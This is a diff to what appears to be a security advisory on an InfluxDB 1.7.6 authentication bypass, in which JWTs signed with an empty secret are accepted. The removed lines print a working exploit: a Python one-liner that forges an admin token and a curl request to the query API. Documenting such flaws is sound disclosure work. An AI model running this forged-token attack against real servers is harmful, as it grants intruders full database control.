@@ -19,17 +19,7 @@ Because HMAC with a zero-length key is a valid (if trivially breakable)
 operation, an attacker can construct a well-formed JWT claiming to be
 the `admin` user, sign it with an empty secret, and present it to the
 InfluxDB HTTP API. The server accepts it as legitimate and grants full
-administrative access:
-
-```
-# Forge a JWT for user "admin" signed with empty secret
-TOKEN=$(python3 -c "
-import jwt, time
-print(jwt.encode({'username':'admin','exp':int(time.time())+3600}, '', algorithm='HS256'))
-")
-curl -H "Authorization: Bearer $TOKEN" http://<host>:8086/query \
-     --data-urlencode 'q=SHOW DATABASES'
-```
+administrative access.
 
 ## Affected Service
 - **Service:** InfluxDB 1.7.6
